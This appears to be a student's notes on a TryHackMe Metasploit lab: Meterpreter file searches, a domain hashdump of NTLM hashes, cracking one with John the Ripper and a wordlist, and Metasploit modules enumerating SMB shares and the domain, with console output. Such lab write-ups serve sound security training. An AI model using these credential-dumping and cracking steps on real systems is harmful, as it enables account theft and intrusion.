---
Tags: MetasploitMeterpreter
date: 06-26-2022
---

[TryHackMe Rooms](./TryHackMeRooms.md)

---

- used search -f secrets.txt to find the file 

- secrets.txt file was located at c:\Program Files (x86)\Windows Multimedia Platform\
- and contained :
  - My Twitter password is KDSvbsw3849!

- migrated to DNS process and got hashdump of (migrate dns.exe)
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:7266b0cffc608b5e9998ce69c723546f:::
```
- used search -f realsecret.txt to find the file 

- realsecret.txt file was located at c:\inetpub\wwwroot\realsecret.txt
- and contained :
  - The Flash is the fastest man alive

---
in order to get the password for jchambers i used john the ripper to crack the hash with the following command and output that follows in the below code block.
```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT jchambershash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Trustno1         (jchambers)     
1g 0:00:00:00 DONE (2022-06-26 21:24) 33.33g/s 1715Kp/s 1715Kc/s 1715KC/s abc789..300195
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 

```

-----
- Question enumerating shares
```
Backgrounding session 2...
msf6 exploit(windows/smb/psexec) > search enum_shares

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  post/windows/gather/enum_shares                   normal  No     Windows Gather SMB Share Enumeration via Registry


Interact with a module by name or index. For example info 0, use 0 or use post/windows/gather/enum_shares

msf6 exploit(windows/smb/psexec) > use 0
msf6 post(windows/gather/enum_shares) > options

Module options (post/windows/gather/enum_shares):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  true             yes       Enumerate currently configured shares
   ENTERED  true             yes       Enumerate Recently entered UNC Paths in the Run Dialog
   RECENT   true             yes       Enumerate Recently mapped shares
   SESSION                   yes       The session to run this module on

msf6 post(windows/gather/enum_shares) > exploit
[-] Post failed: Msf::OptionValidateError One or more options failed to validate: SESSION.
msf6 post(windows/gather/enum_shares) > session
[-] Unknown command: session
msf6 post(windows/gather/enum_shares) > sessions

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ ACME-TEST  10.6.120.116:4444 -> 10.10.134.56:61193 (10.10.134.56)

msf6 post(windows/gather/enum_shares) > set SESSION 2
SESSION => 2
msf6 post(windows/gather/enum_shares) > exploit

[*] Running against session 2
[*] The following shares were found:
[*]     Name: SYSVOL
[*] 
[*]     Name: NETLOGON
[*] 
[*]     Name: speedster
[*] 
[*] Post module execution completed
msf6 post(windows/gather/enum_shares) > 
```
-----

---
- question find  domain
```
msf6 post(windows/gather/enum_domain) > exploit

[+] FOUND Domain: FLASH
[+] FOUND Domain Controller: ACME-TEST (IP: 10.10.134.56)
[*] Post module execution completed
```


---

